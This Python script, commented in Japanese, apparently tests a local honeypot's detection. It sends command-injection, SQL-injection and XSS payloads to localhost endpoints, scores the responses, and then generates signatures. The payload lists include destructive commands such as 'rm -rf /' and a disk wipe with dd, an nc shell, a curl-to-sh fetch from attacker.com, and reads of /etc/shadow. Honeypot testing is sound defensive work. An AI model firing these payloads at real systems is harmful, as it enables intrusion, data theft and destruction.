#!/usr/bin/env python3
"""
強化されたシステムの動作検証テスト
コマンドインジェクション検知精度に焦点
"""

import requests
import time
from urllib.parse import quote

class EnhancedAttackTester:
    def __init__(self, honeypot_url="http://localhost:8080", mcp_server_url="http://localhost:5001"):
        self.honeypot_url = honeypot_url.rstrip('/')
        self.mcp_server_url = mcp_server_url.rstrip('/')
        self.session = requests.Session()
        
    def test_enhanced_command_injection(self):
        """強化されたコマンドインジェクション検知テスト"""
        print("=== 強化コマンドインジェクション検知テスト ===")
        
        # カテゴリー別の高度なペイロード
        test_categories = {
            "基本セパレータ": [
                "; cat /etc/passwd",
                "| ls -la", 
                "&& whoami",
                "|| id",
                "; uname -a"
            ],
            "コマンド代入": [
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "`whoami`",
                "$(id)",
                "`uname -a`"
            ],
            "システム情報収集": [
                "; cat /proc/version",
                "| cat /etc/os-release",
                "&& cat /etc/hostname",
                "|| uname -m",
                "; lsb_release -a"
            ],
            "ネットワークコマンド": [
                "; ping -c 3 127.0.0.1",
                "| netstat -an",
                "&& ifconfig",
                "|| route -n",
                "; arp -a"
            ],
            "ファイル操作": [
                "; find / -name passwd",
                "| cat /var/log/auth.log",
                "&& ls /home/",
                "|| cat /etc/group",
                "; cat /etc/shadow"
            ],
            "Windows系": [
                "& dir C:\\",
                "&& type C:\\windows\\win.ini",
                "| net user",
                "&& ipconfig /all",
                "|| systeminfo"
            ],
            "エンコード回避": [
                "%3Bcat%20/etc/passwd",
                "%7Cwhoami",
                "%26%26id",
                "%7C%7Cuname",
                "%3Bls%20-la"
            ],
            "高度な攻撃": [
                "; rm -rf / --no-preserve-root",
                "| dd if=/dev/zero of=/dev/sda",
                "&& nc -l -p 1234 -e /bin/sh",
                "|| curl http://attacker.com/shell.php | sh",
                "; echo 'hacked' > /etc/passwd"
            ]
        }
        
        total_tests = 0
        successful_detections = 0
        results_by_category = {}
        
        endpoints = [
            ("/search.php", "query"),
            ("/contact.php", "message")
        ]
        
        for category, payloads in test_categories.items():
            print(f"\n--- {category} ---")
            category_results = {"tested": 0, "detected": 0, "responses": []}
            
            for endpoint, param in endpoints:
                for i, payload in enumerate(payloads):
                    try:
                        total_tests += 1
                        category_results["tested"] += 1
                        
                        if param == "query":
                            url = f"{self.honeypot_url}{endpoint}?{param}={quote(payload)}"
                            response = self.session.get(url)
                        else:
                            url = f"{self.honeypot_url}{endpoint}"
                            response = self.session.post(url, data={param: payload})
                        
                        print(f"OK {category} #{i+1}: {payload[:40]}...")
                        print(f"  Status: {response.status_code}")
                        print(f"  Response size: {len(response.text)}")
                        
                        # レスポンス内容の分析
                        response_text = response.text.lower()
                        command_evidence = []
                        
                        # Unix/Linux証拠パターン
                        unix_patterns = [
                            "root:", "bin/bash", "/etc/passwd", "uid=", "gid=",
                            "total ", "drwx", "-rw-", "lrwx", "/home/", "/var/",
                            "linux", "ubuntu", "debian", "kernel"
                        ]
                        
                        # Windows証拠パターン
                        windows_patterns = [
                            "directory of", "volume serial", "<dir>", "c:\\windows",
                            "system32", "program files"
                        ]
                        
                        # エラーパターン
                        error_patterns = [
                            "command not found", "permission denied", "no such file",
                            "access denied", "syntax error", "is not recognized"
                        ]
                        
                        # 証拠検出
                        for pattern in unix_patterns + windows_patterns + error_patterns:
                            if pattern in response_text:
                                command_evidence.append(pattern)
                        
                        if command_evidence:
                            successful_detections += 1
                            category_results["detected"] += 1
                            print(f"  → コマンド実行証拠検出: {command_evidence[:2]}")
                        elif response.status_code in [500, 403]:
                            print(f"  → エラーレスポンス: {response.status_code}")
                        
                        category_results["responses"].append({
                            "payload": payload,
                            "status": response.status_code,
                            "evidence": command_evidence,
                            "response_size": len(response.text)
                        })
                        
                        print()
                        time.sleep(0.3)
                        
                    except Exception as e:
                        print(f"NG Error testing {category} payload #{i+1}: {e}")
            
            results_by_category[category] = category_results
            detection_rate = (category_results["detected"] / category_results["tested"] * 100) if category_results["tested"] > 0 else 0
            print(f"{category} 検出率: {category_results['detected']}/{category_results['tested']} ({detection_rate:.1f}%)")
        
        print(f"\n全体結果:")
        print(f"- 総テスト数: {total_tests}")
        print(f"- 成功検出数: {successful_detections}")
        print(f"- 総検出率: {(successful_detections/total_tests*100):.1f}%")
        
        return results_by_category
    
    def test_sql_injection_comprehensive(self):
        """包括的SQLインジェクションテスト"""
        print("\n=== 包括的SQLインジェクションテスト ===")
        
        sql_categories = {
            "Union-based": [
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,version(),3--",
                "' UNION SELECT 1,user(),database()--"
            ],
            "Error-based": [
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--"
            ],
            "Time-based": [
                "' AND SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            "Boolean-based": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a",
                "' AND 'a'='b"
            ]
        }
        
        sql_results = {}
        total_sql = 0
        successful_sql = 0
        
        for category, payloads in sql_categories.items():
            print(f"\n--- {category} SQLi ---")
            category_success = 0
            
            for payload in payloads:
                try:
                    total_sql += 1
                    url = f"{self.honeypot_url}/account.php?id={quote(payload)}"
                    start_time = time.time()
                    response = self.session.get(url)
                    end_time = time.time()
                    response_time = (end_time - start_time) * 1000
                    
                    print(f"OK {payload[:40]}...")
                    print(f"  Status: {response.status_code}, Time: {response_time:.0f}ms")
                    
                    if response.status_code == 500:
                        successful_sql += 1
                        category_success += 1
                        print("  → SQLエラー検出成功")
                    elif response_time > 4000 and "SLEEP" in payload:
                        successful_sql += 1 
                        category_success += 1
                        print("  → 時間ベース検出成功")
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    print(f"NG Error: {e}")
            
            sql_results[category] = {"success": category_success, "total": len(payloads)}
        
        print(f"\nSQL injection 総結果: {successful_sql}/{total_sql} ({(successful_sql/total_sql*100):.1f}%)")
        return sql_results
    
    def test_xss_comprehensive(self):
        """包括的XSSテスト"""
        print("\n=== 包括的XSSテスト ===")
        
        xss_payloads = [
            # 基本
            "<script>alert('XSS')</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            
            # イベントハンドラー
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            
            # JavaScript URL
            "javascript:alert('XSS')",
            
            # フィルター回避
            "<script src=data:,alert('XSS')></script>",
            "</textarea><script>alert('XSS')</script>",
            
            # 高度
            "<svg><animatetransform onbegin=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>"
        ]
        
        xss_success = 0
        xss_total = len(xss_payloads)
        
        for payload in xss_payloads:
            try:
                url = f"{self.honeypot_url}/search.php?query={quote(payload)}"
                response = self.session.get(url)
                
                if payload in response.text or payload.lower() in response.text.lower():
                    xss_success += 1
                    print(f"OK XSS反映: {payload[:30]}...")
                else:
                    print(f"- XSS未反映: {payload[:30]}...")
                
                time.sleep(0.2)
                
            except Exception as e:
                print(f"NG Error: {e}")
        
        print(f"XSS 総結果: {xss_success}/{xss_total} ({(xss_success/xss_total*100):.1f}%)")
        return {"success": xss_success, "total": xss_total}
    
    def generate_enhanced_signatures(self):
        """強化されたシグネチャ生成"""
        print("\n=== 強化シグネチャ生成 ===")
        
        try:
            # ログ処理時間を待つ
            time.sleep(5)
            
            # 強化されたシグネチャ生成器を実行
            import subprocess
            result = subprocess.run(
                ["python3", "enhanced_signature_generator.py"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            print("シグネチャ生成結果:")
            print(result.stdout)
            
            if result.stderr:
                print("エラー:")
                print(result.stderr)
            
            return result.returncode == 0
            
        except Exception as e:
            print(f"シグネチャ生成エラー: {e}")
            return False

def main():
    tester = EnhancedAttackTester()
    
    print("強化されたシステムの動作検証開始")
    print("=" * 60)
    
    # 1. 強化されたコマンドインジェクション検知テスト
    cmd_results = tester.test_enhanced_command_injection()
    
    # 2. 包括的SQLインジェクションテスト
    sql_results = tester.test_sql_injection_comprehensive()
    
    # 3. 包括的XSSテスト
    xss_results = tester.test_xss_comprehensive()
    
    # 4. 強化されたシグネチャ生成
    signature_success = tester.generate_enhanced_signatures()
    
    print("\n" + "=" * 60)
    print("動作検証結果サマリー")
    print("=" * 60)
    
    # コマンドインジェクション結果
    total_cmd_tests = sum(cat["tested"] for cat in cmd_results.values())
    total_cmd_detections = sum(cat["detected"] for cat in cmd_results.values())
    cmd_detection_rate = (total_cmd_detections / total_cmd_tests * 100) if total_cmd_tests > 0 else 0
    
    print(f"1. コマンドインジェクション検知:")
    print(f"   - テスト数: {total_cmd_tests}")
    print(f"   - 検出数: {total_cmd_detections}")
    print(f"   - 検出率: {cmd_detection_rate:.1f}%")
    
    for category, result in cmd_results.items():
        rate = (result["detected"] / result["tested"] * 100) if result["tested"] > 0 else 0
        print(f"   - {category}: {result['detected']}/{result['tested']} ({rate:.1f}%)")
    
    print(f"\n2. SQLインジェクション:")
    for category, result in sql_results.items():
        rate = (result["success"] / result["total"] * 100) if result["total"] > 0 else 0
        print(f"   - {category}: {result['success']}/{result['total']} ({rate:.1f}%)")
    
    print(f"\n3. XSS:")
    xss_rate = (xss_results["success"] / xss_results["total"] * 100) if xss_results["total"] > 0 else 0
    print(f"   - 反映率: {xss_results['success']}/{xss_results['total']} ({xss_rate:.1f}%)")
    
    print(f"\n4. シグネチャ生成: {'成功' if signature_success else '失敗'}")
    
    print("\n" + "=" * 60)
    print("検証完了")

if __name__ == "__main__":
    main()